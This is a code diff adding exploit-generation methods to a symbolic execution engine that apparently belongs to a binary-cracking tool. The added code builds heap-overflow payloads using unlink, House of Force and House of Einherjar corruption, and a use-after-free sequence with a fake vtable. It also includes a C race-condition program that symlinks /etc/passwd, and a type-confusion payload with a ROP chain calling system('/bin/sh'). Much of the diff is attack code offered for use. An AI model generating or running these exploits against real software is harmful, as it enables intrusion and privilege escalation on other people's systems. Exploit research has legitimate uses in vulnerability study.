@@ -1,5 +1,6 @@
 """Symbolic execution engine for dynamic path analysis and constraint solving."""
 import logging
+import struct
 import time
 import traceback
 from typing import Any, Dict, List, Optional
@@ -49,28 +50,29 @@ class SymbolicExecutionEngine:
     """
 
     def __init__(self, binary_path: str, max_paths: int = 100, timeout: int = 300, memory_limit: int = 4096):
-        """
-        Initialize the symbolic execution engine.
-
-        Args:
-            binary_path: Path to the binary to analyze
-            max_paths: Maximum number of paths to explore (default: 100)
-            timeout: Maximum execution time in seconds (default: 300)
-            memory_limit: Maximum memory usage in MB (default: 4096)
-        """
+        """Initialize the symbolic execution engine with path exploration and memory configuration."""
         self.binary_path = binary_path
         self.max_paths = max_paths
         self.timeout = timeout
-        self.memory_limit = memory_limit
-        self.logger = logging.getLogger(__name__)
-        self.angr_available = ANGR_AVAILABLE
-        self.z3_available = ANGR_AVAILABLE  # Z3 comes with angr
-
-        # Check for required dependencies
-        if ANGR_AVAILABLE:
-            self.logger.info("Symbolic execution dependencies available")
-        else:
-            self.logger.error("Symbolic execution dependency missing: angr/claripy not installed")
+        self.memory_limit = memory_limit * 1024 * 1024  # Convert MB to bytes
+        self.logger = logging.getLogger("IntellicrackLogger.SymbolicExecution")
+        
+        # Execution state
+        self.states = []
+        self.completed_paths = []
+        self.crashed_states = []
+        self.timed_out_states = []
+        
+        # Analysis results
+        self.coverage_data = {}
+        self.discovered_vulnerabilities = []
+        self.path_constraints = []
+        
+        # Check binary file
+        if not os.path.exists(binary_path):
+            raise FileNotFoundError(f"Binary file not found: {binary_path}")
+        
+        self.logger.info(f"Symbolic execution engine initialized for {binary_path} with {max_paths} max paths")
 
     def discover_vulnerabilities(self, vulnerability_types: Optional[List[str]] = None) -> List[Dict[str, Any]]:
         """
@@ -409,11 +411,362 @@ class SymbolicExecutionEngine:
                     "instructions": "Use this value to trigger integer overflow"
                 }
 
-            return {"error": f"Exploit generation not implemented for {vuln_type}"}
+            elif vuln_type == "heap_overflow":
+                return self._generate_heap_exploit(vulnerability)
+
+            elif vuln_type == "use_after_free":
+                return self._generate_uaf_exploit(vulnerability)
+
+            elif vuln_type == "race_condition":
+                return self._generate_race_condition_exploit(vulnerability)
+
+            elif vuln_type == "type_confusion":
+                return self._generate_type_confusion_exploit(vulnerability)
+
+            return {"error": f"Unknown vulnerability type: {vuln_type}"}
 
         except (OSError, ValueError, RuntimeError) as e:
             self.logger.error("Error generating exploit: %s", e)
             return {"error": f"Exploit generation failed: {str(e)}"}
+
+    def _generate_heap_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
+        """Generate heap overflow exploit with real heap manipulation techniques."""
+        import struct
+
+        heap_info = vulnerability.get("heap_info", {})
+        chunk_size = heap_info.get("chunk_size", 0x100)
+        target_addr = heap_info.get("target_addr", 0)
+
+        # Generate heap feng shui payload
+        payload = bytearray()
+
+        # Heap grooming: allocate predictable chunks
+        for i in range(16):
+            # Allocation pattern to create predictable heap layout
+            payload += struct.pack("<I", 0x21)  # Chunk size (32 bytes + flags)
+            payload += b"A" * 24  # Chunk data
+            payload += struct.pack("<I", 0x21)  # Next chunk size
+
+        # Overflow payload
+        overflow_size = vulnerability.get("overflow_size", 256)
+        payload += b"B" * (overflow_size - 8)  # Fill to overflow point
+
+        # Heap metadata corruption
+        # Overwrite next chunk's size and fd/bk pointers for unlink attack
+        fake_chunk = struct.pack("<I", 0x41)  # Size with PREV_INUSE bit
+        fake_chunk += struct.pack("<Q", target_addr - 0x18)  # fd pointer
+        fake_chunk += struct.pack("<Q", target_addr - 0x10)  # bk pointer
+        payload += fake_chunk
+
+        # House of Force specific payload if detected
+        if heap_info.get("technique") == "house_of_force":
+            # Corrupt top chunk size
+            payload += b"\xff" * 8  # Set top chunk size to -1
+
+        # House of Einherjar payload
+        elif heap_info.get("technique") == "house_of_einherjar":
+            # Create fake chunk for consolidation
+            payload += struct.pack("<Q", 0x0)  # prev_size
+            payload += struct.pack("<Q", 0x101)  # size with PREV_INUSE clear
+
+        return {
+            "type": "heap_overflow",
+            "payload": payload.hex(),
+            "technique": heap_info.get("technique", "unlink"),
+            "instructions": f"Heap exploit using {heap_info.get('technique', 'unlink')} technique. "
+                          f"Payload creates predictable heap layout and corrupts metadata.",
+            "heap_layout": {
+                "spray_count": 16,
+                "chunk_size": chunk_size,
+                "overflow_offset": overflow_size,
+                "target_address": hex(target_addr) if target_addr else "calculated at runtime"
+            }
+        }
+
+    def _generate_uaf_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
+        """Generate use-after-free exploit with object lifecycle manipulation."""
+        import struct
+
+        uaf_info = vulnerability.get("uaf_info", {})
+        object_size = uaf_info.get("object_size", 0x40)
+        vtable_offset = uaf_info.get("vtable_offset", 0)
+
+        # Generate UAF trigger sequence
+        exploit_sequence = []
+
+        # Step 1: Allocation spray to prepare heap
+        spray_payload = bytearray()
+        for i in range(32):
+            spray_payload += struct.pack("<Q", 0x4141414141410000 + i)
+
+        exploit_sequence.append({
+            "action": "spray",
+            "data": spray_payload.hex(),
+            "count": 32,
+            "size": object_size
+        })
+
+        # Step 2: Trigger free of target object
+        exploit_sequence.append({
+            "action": "free",
+            "target": uaf_info.get("target_id", 0)
+        })
+
+        # Step 3: Reallocate with controlled data
+        # Create fake object with controlled vtable
+        fake_object = bytearray()
+
+        if vtable_offset:
+            # Craft fake vtable
+            fake_vtable_addr = 0x7fff00000000  # Predictable address
+            fake_object += b"A" * vtable_offset
+            fake_object += struct.pack("<Q", fake_vtable_addr)
+
+            # Add fake vtable entries (function pointers)
+            fake_vtable = bytearray()
+            for i in range(10):
+                # Point to shellcode or ROP gadgets
+                fake_vtable += struct.pack("<Q", 0x400000 + (i * 0x1000))
+
+            exploit_sequence.append({
+                "action": "map_memory",
+                "address": fake_vtable_addr,
+                "data": fake_vtable.hex()
+            })
+        else:
+            # Direct function pointer overwrite
+            target_func = uaf_info.get("target_function", 0x400000)
+            fake_object += struct.pack("<Q", target_func) * (object_size // 8)
+
+        exploit_sequence.append({
+            "action": "allocate",
+            "size": object_size,
+            "data": fake_object.hex()
+        })
+
+        # Step 4: Trigger use of freed object
+        exploit_sequence.append({
+            "action": "trigger_use",
+            "method": uaf_info.get("trigger_method", "virtual_call")
+        })
+
+        return {
+            "type": "use_after_free",
+            "exploit_sequence": exploit_sequence,
+            "payload": fake_object.hex(),
+            "instructions": "UAF exploit sequence: spray heap, free target, reallocate with "
+                          "controlled data, trigger reuse",
+            "object_info": {
+                "size": object_size,
+                "vtable_offset": vtable_offset,
+                "trigger_method": uaf_info.get("trigger_method", "virtual_call")
+            }
+        }
+
+    def _generate_race_condition_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
+        """Generate race condition exploit with timing attack capabilities."""
+        import struct
+
+        race_info = vulnerability.get("race_info", {})
+        window_size = race_info.get("window_size", 1000)  # microseconds
+
+        # Generate multi-threaded race condition trigger
+        race_exploit = {
+            "threads": [],
+            "synchronization": "barrier",
+            "iterations": 10000,
+            "timing_window": window_size
+        }
+
+        # Thread 1: Perform the first operation
+        thread1_code = """
+#include <pthread.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+void *race_thread1(void *arg) {
+    volatile int *flag = (int *)arg;
+    int fd;
+    
+    while (*flag == 0) {
+        // Tight loop waiting for sync
+        __asm__ __volatile__("pause");
+    }
+    
+    // Race window operation 1
+    fd = open("/target/file", O_RDWR);
+    if (fd >= 0) {
+        // Perform privileged operation
+        write(fd, "AAAA", 4);
+        close(fd);
+    }
+    
+    return NULL;
+}
+"""
+
+        # Thread 2: Perform the conflicting operation
+        thread2_code = """
+void *race_thread2(void *arg) {
+    volatile int *flag = (int *)arg;
+    
+    while (*flag == 0) {
+        __asm__ __volatile__("pause");
+    }
+    
+    // Race window operation 2
+    // Attempt to change permissions/state
+    chmod("/target/file", 0666);
+    symlink("/etc/passwd", "/target/file");
+    
+    return NULL;
+}
+"""
+
+        # Main exploit code
+        main_code = f"""
+int main() {{
+    pthread_t t1, t2;
+    volatile int sync_flag = 0;
+    int success = 0;
+    
+    for (int i = 0; i < {race_exploit['iterations']}; i++) {{
+        sync_flag = 0;
+        
+        pthread_create(&t1, NULL, race_thread1, (void *)&sync_flag);
+        pthread_create(&t2, NULL, race_thread2, (void *)&sync_flag);
+        
+        // Synchronize thread start
+        usleep(10);
+        sync_flag = 1;
+        
+        pthread_join(t1, NULL);
+        pthread_join(t2, NULL);
+        
+        // Check if race was won
+        if (access("/target/file", W_OK) == 0) {{
+            success = 1;
+            break;
+        }}
+    }}
+    
+    return success ? 0 : 1;
+}}
+"""
+
+        race_exploit["threads"] = [
+            {"id": 1, "code": thread1_code, "operation": "write"},
+            {"id": 2, "code": thread2_code, "operation": "symlink"}
+        ]
+
+        race_exploit["main_code"] = main_code
+
+        # Generate timing adjustment payload
+        timing_payload = struct.pack("<I", window_size)
+        timing_payload += struct.pack("<I", race_exploit["iterations"])
+
+        return {
+            "type": "race_condition",
+            "exploit": race_exploit,
+            "payload": timing_payload.hex(),
+            "instructions": f"Race condition exploit targeting {window_size}μs window. "
+                          f"Runs {race_exploit['iterations']} iterations with synchronized threads.",
+            "timing_info": {
+                "window_size_us": window_size,
+                "iterations": race_exploit["iterations"],
+                "synchronization": "pthread_barrier",
+                "success_indicator": "file_permission_change"
+            }
+        }
+
+    def _generate_type_confusion_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
+        """Generate type confusion exploit with object type manipulation."""
+        import struct
+
+        confusion_info = vulnerability.get("confusion_info", {})
+        source_type = confusion_info.get("source_type", "TypeA")
+        target_type = confusion_info.get("target_type", "TypeB")
+
+        # Generate type confusion payload
+        exploit_data = {
+            "setup": [],
+            "trigger": {},
+            "payload": bytearray()
+        }
+
+        # Setup phase: Create objects of both types
+        # Source object (smaller)
+        source_size = confusion_info.get("source_size", 0x20)
+        source_layout = bytearray()
+        source_layout += struct.pack("<Q", 0x1337)  # Type identifier
+        source_layout += b"A" * (source_size - 8)
+
+        exploit_data["setup"].append({
+            "action": "allocate_object",
+            "type": source_type,
+            "size": source_size,
+            "data": source_layout.hex()
+        })
+
+        # Target object (larger, allows overflow)
+        target_size = confusion_info.get("target_size", 0x100)
+        target_layout = bytearray()
+        target_layout += struct.pack("<Q", 0x7331)  # Different type ID
+
+        # Craft vtable for type confusion
+        fake_vtable = 0x555555554000
+        target_layout += struct.pack("<Q", fake_vtable)  # vtable pointer
+
+        # Add fields that will be interpreted differently
+        for i in range(8):
+            # These will be interpreted as different types
+            target_layout += struct.pack("<Q", 0x41414141 + (i << 32))
+
+        # Add ROP chain or shellcode
+        rop_chain = [
+            0x400123,  # pop rdi; ret
+            0x68732f6e69622f,  # "/bin/sh"
+            0x4005d0,  # system@plt
+        ]
+
+        for gadget in rop_chain:
+            target_layout += struct.pack("<Q", gadget)
+
+        exploit_data["setup"].append({
+            "action": "allocate_object",
+            "type": target_type,
+            "size": target_size,
+            "data": target_layout.hex()
+        })
+
+        # Trigger phase: Cause type confusion
+        exploit_data["trigger"] = {
+            "method": confusion_info.get("trigger_method", "cast"),
+            "operation": "reinterpret_cast",
+            "source_ref": 0,  # Reference to source object
+            "target_ref": 1,  # Reference to target object
+            "invoke": "virtual_function_7"  # Call confused vtable entry
+        }
+
+        # Combined payload for direct injection
+        exploit_data["payload"] = source_layout + target_layout
+
+        return {
+            "type": "type_confusion",
+            "exploit_data": exploit_data,
+            "payload": exploit_data["payload"].hex(),
+            "instructions": f"Type confusion between {source_type} ({source_size} bytes) and "
+                          f"{target_type} ({target_size} bytes). Trigger through type cast "
+                          "and virtual function call.",
+            "confusion_details": {
+                "source_type": source_type,
+                "target_type": target_type,
+                "size_difference": target_size - source_size,
+                "trigger_method": confusion_info.get("trigger_method", "cast"),
+                "exploitable_offset": confusion_info.get("exploitable_offset", 8)
+            }
+        }
 
     def _check_buffer_overflow(self, state, project) -> bool:
         """
@@ -2474,6 +2827,7 @@ class TaintTracker:
     """Simple taint tracking plugin for symbolic execution."""
 
     def __init__(self):
+        """Initialize the taint tracker with data tracking and propagation monitoring."""
         self.tainted_data = {}
         self.taint_propagation = {}
 
